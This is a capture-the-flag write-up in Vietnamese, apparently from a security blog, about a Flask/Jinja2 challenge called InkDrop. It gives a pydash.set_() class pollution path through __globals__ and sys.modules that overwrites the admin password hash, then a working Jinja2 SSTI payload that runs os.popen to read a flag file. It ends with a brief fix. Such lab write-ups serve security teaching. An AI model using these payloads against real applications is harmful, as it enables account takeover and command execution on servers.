+++
title = "InkDrop — từ pydash Class Pollution đến SSTI"
date = 2026-10-31T20:02:00+07:00
draft = false
tags = ["Web", "Python", "pydash", "Class Pollution", "SSTI", "Jinja2"]
categories = ["Writeups"]
summary = "Dùng tiêu đề bài viết làm deep path để đổi mật khẩu admin, rồi lợi dụng Jinja2 Template Preview để thực thi lệnh."
ShowToc = true
TocOpen = false

[cover]
  image = "/images/imported/inkdrop/ssti-payload.png"
  alt = "InkDrop article chứa payload SSTI"
  hiddenInSingle = true
+++

InkDrop là ứng dụng blog Flask/Jinja2. Tài khoản ban đầu `testuser / password123` chỉ có quyền tạo và đọc bài; chức năng Template Preview dành cho admin. Điểm mở đầu của bài không nằm ở Jinja2 mà ở cách ứng dụng dùng tiêu đề bài viết làm đường dẫn thuộc tính (`deep path`) cho `pydash.set_()`.

## Tiêu đề không chỉ là một chuỗi

Khi tạo bài, hành vi của ứng dụng tương đương với:

```python
pydash.set_(articles, title, content)
```

`title` là đường dẫn cần ghi, còn `content` là giá trị. Trong phiên bản và cấu hình của challenge, đường dẫn này có thể đi qua các thuộc tính dunder, từ object bài viết tới namespace toàn cục rồi tới object quản lý user.

Mục tiêu đầu tiên là đổi hash mật khẩu admin. Mình chọn mật khẩu `hacked123`; SHA-256 của nó là:

```text
21821604314c59670868e2b6abf71c5483c23ff209e65ab4ccf86db1f3792c5e
```

Tạo một bài viết với tiêu đề:

```text
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.users.admin.password
```

và nội dung:

```text
21821604314c59670868e2b6abf71c5483c23ff209e65ab4ccf86db1f3792c5e
```

Path trên lần lượt đi từ hàm khởi tạo tới `__globals__`, qua module loader và `sys.modules`, rồi tới module `__main__` đang giữ object `users`. Bước cuối ghi giá trị do mình chọn vào trường password của admin.

Đăng xuất và đăng nhập lại bằng:

```text
admin / hacked123
```

Ứng dụng chấp nhận mật khẩu mới và cấp session admin.

## Bật Template Preview và khai thác SSTI

Với quyền admin, truy cập route sau để bật chế độ render template:

```http
GET /show_template?value=1
```

Từ đây, nội dung bài viết được đưa vào `render_template_string()`. Payload phải nằm trong trường Content; Title chỉ dùng làm tên/path của bài.

Tạo bài `rce` với nội dung:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /root/flag.txt').read() }}
```

![Bài viết chứa payload SSTI](/images/imported/inkdrop/ssti-payload.png)

Khi mở bài, Jinja2 đánh giá biểu thức, gọi `os.popen()` và đưa nội dung `/root/flag.txt` vào trang:

![Flag được render trong bài viết](/images/imported/inkdrop/flag.png)

```text
FLAG{9be0bea20ea10867f8474deb80cd7c36}
```

`pydash.set_()` chỉ ghi được tới những object mà path có thể lần tới. Trong challenge này, object graph dẫn được từ bài viết sang `users`, nên mới có thể đổi mật khẩu admin. Cách sửa là không dùng `title` làm path và không đưa nội dung người dùng vào `render_template_string()`.
